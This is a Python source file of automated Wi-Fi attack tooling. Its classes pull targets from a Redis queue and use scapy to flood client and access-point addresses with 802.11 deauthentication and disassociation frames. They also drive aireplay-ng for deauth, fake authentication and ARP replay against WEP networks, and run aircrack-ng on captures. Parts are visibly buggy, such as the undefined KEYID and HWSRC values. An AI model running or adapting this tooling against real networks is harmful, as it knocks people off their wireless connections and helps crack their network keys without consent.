import json
import logging
from time import sleep
from datetime import datetime
from multiprocessing import Process
from subprocess import Popen, PIPE
from tempfile import NamedTemporaryFile

from dateutil.parser import parse
from redis import StrictRedis
from scapy.sendrecv import sendp
from scapy.all import (
    Dot11,
    Dot11WEP,
    LLC,
    SNAP,
    ARP,
    Dot11Deauth,
    Dot11Disas,
    RadioTap,
)
from pyrcrack.replaying import Aireplay
from lcubo_helpers import load_json
from wifi_tools.events import change_channel_signal
from wifi_tools.settings import (
    AIREPLAY_LOG,
    AIREPLAY_ERROR_LOG,
)
logger = logging.getLogger(__name__)


class CustomAttack(Process):
    """
        Base Class for attack methods that are triggered by subscription
    """

    def __init__(self, iface, max_channel=11):
        super(CustomAttack, self).__init__()
        self.iface = iface
        self.max_channel = max_channel
        self.channel = None
        self.attack_chanel = 0
        self.redis_server = StrictRedis("localhost")

    def run(self):
        try:
            while True:
                item = self.redis_server.lpop('client_attack_queue_{0}'.format(self.iface))
                if item is None:
                    sleep(0.5)
                    continue

                data = json.loads(item.decode('utf8'))
                now = datetime.utcnow()
                delta = now - parse(data['date'])
                if delta.seconds < 10:
                    logger.info('Signal received on {0}. Client seen {1} seconds ago. launching ...'.format(self.__class__.__name__, delta.seconds))
                    self.tick(data)
                sleep(0.5)
        except KeyboardInterrupt:
            logger.info('User sent keyboard interrupt. Stopping process')

    def tick(self):
        raise NotImplementedError()


class DeauthAttack(CustomAttack):

    def __init__(self, iface, max_channel=11):
        self.iface = iface
        self.max_channel = max_channel
        super(DeauthAttack, self).__init__(iface, max_channel)
        self.channel = None
        self.attack_chanel = 0
        self.timeinterval = None
        self.packets = None

    def __str__(self):
        return f'DeauthAttack on interface {self.iface}'

    def tick(self, data):
        '''
        addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
        multi-APs to one gateway. Constantly scans the clients_APs list and
        starts a thread to deauth each instance
        '''
        logger.info('Sending attacks using interface {0}'.format(self.iface))
        pkts = self.attack_clients(data)
        self.send_packets(pkts)
        pkts = self.attack_access_points(data)
        self.send_packets(pkts)

    def attack_clients(self, data):
        pkts = []
        access_point_bssid = data['bssid']
        clients = [data['client_addr']]

        clients += self.redis_server.smembers('clients_{0}'.format(access_point_bssid))
        if not clients:
            logger.warn('No clients found for ap {0}'.format(access_point_bssid))
            return []
        access_point = self.redis_server.hgetall('access_point_{0}'.format(access_point_bssid))
        access_point and logger.info(f'Got {len(clients)} clients for access point {access_point.get("ssid")}')
        # Can't add a RadioTap() layer as the first layer or it's a malformed
        # Association request packet?
        # Append the packets to a new list so we don't have to hog the lock
        # type=0, subtype=12?
        for client_addr in clients:
            logger.debug(f'Creating packet to deauth client {client_addr}')
            logger.debug(f'Destination {client_addr} source {access_point_bssid} bssid {access_point_bssid}')
            # Deauth packets
            deauth_pkt1 = RadioTap(present=0) / Dot11(addr1=access_point_bssid, addr2=client_addr, addr3=access_point_bssid, type=0, subtype=12) / Dot11Deauth(reason=3)
            # disas packet source is bssid and dest client
            deauth_pkt2 = RadioTap(present=0) / Dot11(addr1=client_addr, addr2=access_point_bssid, addr3=access_point_bssid, type=0, subtype=12) / Dot11Disas(reason=3)
            pkts.append(deauth_pkt1)
            pkts.append(deauth_pkt2)
        return pkts

    def attack_access_points(self, data):
        pkts = []
        access_point_bssid = data['bssid']
        logger.debug('Creating packet to deauth AP {0}'.format(access_point_bssid))
        logger.debug('destination {0} source {1} bssid {2}'.format('ff:ff:ff:ff:ff:ff', access_point_bssid, access_point_bssid))
        deauth_ap = RadioTap(present=0) / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=access_point_bssid, addr3=access_point_bssid, type=0, subtype=12) / Dot11Deauth(reason=3)
        pkts.append(deauth_ap)
        deauth_ap = RadioTap(present=0) / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=access_point_bssid, addr3=access_point_bssid, type=0, subtype=12) / Dot11Disas(reason=3)
        pkts.append(deauth_ap)
        return pkts

    def send_packets(self, pkts):
        self.redis_server.hincrby('session_stats', 'attack_count')
        if len(pkts) > 0:
            logging.info('Sending {0} deauth packets on interface {1}'.format(len(pkts), self.iface))
            # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
            if not self.timeinterval:
                self.timeinterval = 0
            if not self.packets:
                self.packets = 5

            for packet in pkts:
                logger.debug('Sending packet on interface {0}...'.format(self.iface))
                sendp(packet, inter=float(self.timeinterval), count=int(self.packets), iface=self.iface, verbose=False)


class TargetAttack(CustomAttack):

    def __init__(self, iface, max_channel=11):
        super(TargetAttack, self).__init__(iface, max_channel)
        self.subscribe_channel = 'target_found'

    def tick(self, data):
        access_point = load_json(self.redis_server, 'access_point_{0}'.format(data['bssid']))
        ap_channel = access_point['channel']
        logger.info('Target {0} found. force channel {1}'.format(data, ap_channel))
        self.redis_server.set('force_channel_{0}'.format(self.iface), ap_channel)
        self.redis_server.set('force_access_point_{0}'.format(self.iface), data['bssid'])

        # pass

        self.redis_server.delete('force_channel_{0}'.format(self.iface))
        self.redis_server.delete('force_access_point_{0}'.format(self.iface))


class WEPAttack(CustomAttack):

    def __init__(self, iface, max_channel=11):
        super(WEPAttack, self).__init__(iface, max_channel)
        self.subscribe_channel = 'wep_found'

    def tick(self, data):
        self.arp_request_replay(data)

    def fake_auth(self):
        pass

    def arp_request_replay(self, data):
        """
             listens for an ARP packet then retransmits it back to the access point
        """
        logger.info('Detected WEP ARP request. Flooding with responses')
        arp_answer = RadioTap() / Dot11(
            type="Data",
            FCfield="from-DS",
            addr1=data['addr1'],
            addr2=data['bssid'],
            addr3=data['bssid'])
        arp_answer.FCfield |= 0x40
        arp_answer /= Dot11WEP(
            iv="111",
            keyid=KEYID)
        arp_answer /= LLC(ctrl=3) / SNAP() / ARP(
            op="is-at",
            hwsrc=HWSRC,
            psrc=arp_answer.getlayer(ARP).pdst,
            hwdst=arp_answer.getlayer(ARP).hwsrc,
            pdst=arp_answer.getlayer(ARP).psrc)
        arp_answer /= arp_answer.getlayer(ARP).payload
        sendp(arp_answer, verbose=0)


class AireplayAttack(CustomAttack):

    def poll_process(self, aireplay_deauth):
        start = datetime.now()
        while aireplay_deauth._proc.poll():
            now = datetime.now()
            delta = now - start
            logger.info('Waiting attack to finish since {0}'.format(delta.seconds))
            if delta.seconds > 10:
                # os.killpg(os.getpgid(aireplay_deauth.pid), signal.SIGTERM)
                aireplay_deauth.stop()
                break
            sleep(0.5)

    def tick(self, data):
        bssid = data['bssid']
        essid = data['ssid']
        client_address = data['client_addr']
        logger.info('Starting aireplay deauth on BSSID {0} on interface {1}'.format(data['bssid'], self.iface))
        stdout_file = open(AIREPLAY_LOG, 'a')
        stderr_file = open(AIREPLAY_ERROR_LOG, 'a')
        # attack using client information
        aireplay_deauth = Aireplay(attack='deauth', interface=self.iface, a=bssid, e=essid,stdout=stdout_file, stderr=stderr_file)
        aireplay_deauth.start()
        for _ in range(0, 2):
            aireplay_deauth = Aireplay(attack='deauth', interface=self.iface, c=client_address, a=bssid, e=essid, stdout=stdout_file, stderr=stderr_file)
            aireplay_deauth.start()
            aireplay_deauth.stop()
        attack_id = data['attack_id']
        self.redis_server.set('attack_done_{0}'.format(attack_id), True)


class AireplayWEPAttack(CustomAttack):

    def tick(self, data):
        bssid = data['bssid'].lower()
        current_channel = int(self.redis_server.get('current_channel_{0}'.format(self.iface)))
        if int(data['channel']) != current_channel:
            # logger.info('AP in channel {0} current channel is {1}, skipping'.format(data['channel'], current_channel))
            return
        logger.info('Starting aireplay deauth')
        clients = self.redis_server.smembers('clients_{0}'.format(bssid))
        fakeauths = []
        aireplay_arpreplay = None
        for client_address in clients:
            stdout_file = NamedTemporaryFile()
            stderr_file = open(AIREPLAY_ERROR_LOG, 'a')
            aireplay_fakeauth = Aireplay(attack='fakeauth', interface=self.iface, h=client_address, a=bssid, stdout=stdout_file, stderr=stderr_file)
            aireplay_fakeauth.start()
            fakeauths.append(aireplay_fakeauth)
            sleep(1)
            stdout_file.seek(0)
            output = stdout_file.read()
            logger.info(output)
            if 'Association successful :-)' in str(output):
                logger.info('Association successful :-)')
                aireplay_arpreplay = Aireplay(attack='arpreplay', interface=self.iface, h=client_address, a=bssid, stdout=stdout_file, stderr=stderr_file)
                aireplay_arpreplay.start()
                packets = self.redis_server.get('client_packets_{0}'.format(client_address)) or 0
                limit = 0
                while packets < 100 or limit <= 1000:
                    logger.info('Generated {0} packets'.format(packets))
                    packets = self.redis_server.get('client_packets_{0}'.format(client_address))
                    limit += 1
        for fakeauth in fakeauths:
            fakeauth.stop()
        if aireplay_arpreplay:
            aireplay_arpreplay.stop()
        change_channel_signal.set()
        change_channel_signal.clear()


class AirCrackCheckCaptureFiles(CustomAttack):

    def tick(self, filename):

        proc = Popen(['aircrack-ng', filename], stdin=PIPE, stdout=PIPE)
        for line in iter(proc.stdout.readline, ''):

            pass
